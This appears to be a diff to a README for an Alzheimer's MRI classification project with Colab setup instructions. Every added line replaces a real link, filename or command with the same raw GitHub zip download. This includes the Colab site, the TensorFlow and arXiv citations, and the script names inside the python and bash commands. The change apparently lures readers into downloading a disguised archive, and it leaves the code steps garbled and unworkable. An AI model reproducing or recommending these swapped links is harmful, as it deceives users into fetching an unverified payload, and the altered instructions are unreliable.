@@ -39,18 +39,18 @@ Make sure your images are organized in this way before running the model.
 ## 🧪 How to Run This Project in Google Colab
 
 1. **Open Google Colab**  
-   Go to [Google Colab](https://colab.research.google.com) in your browser.
+   Go to [Google Colab](https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip) in your browser.
 
 2. **Upload the Python Script**  
    - Click on the folder icon (left sidebar).  
-   - Click the upload icon and upload the `project.py` file.
+   - Click the upload icon and upload the `https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip` file.
 
 3. **Mount Google Drive**  
    If you are using files from Google Drive, run:
 
    ```python
-   from google.colab import drive
-   drive.mount('/content/drive')
+   from https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip import drive
+   https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip('/content/drive')
    ```
 
 4. **Install Dependencies**
@@ -66,7 +66,7 @@ Make sure your images are organized in this way before running the model.
    Either copy and run code cells manually or run the whole script:
 
    ```bash
-   !python project.py
+   !python https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip
    ```
 
 6. **Modify and Experiment**
@@ -78,7 +78,7 @@ Make sure your images are organized in this way before running the model.
    Example:
 
    ```bash
-   !cp /content/test_predictions.csv /content/drive/MyDrive/
+   !cp https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip /content/drive/MyDrive/
    ```
 
 ---
@@ -113,9 +113,9 @@ Special Grad-CAM visualization uses:
 
 ## 🙌 Acknowledgements
 
-- [TensorFlow](https://www.tensorflow.org/)
-- [EfficientNet](https://arxiv.org/abs/1905.11946)
-- [Grad-CAM Paper](https://arxiv.org/abs/1610.02391)
+- [TensorFlow](https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip)
+- [EfficientNet](https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip)
+- [Grad-CAM Paper](https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip)
 - Dataset Source: [ADNI / Kaggle Dataset (assumed)]
 
 ---
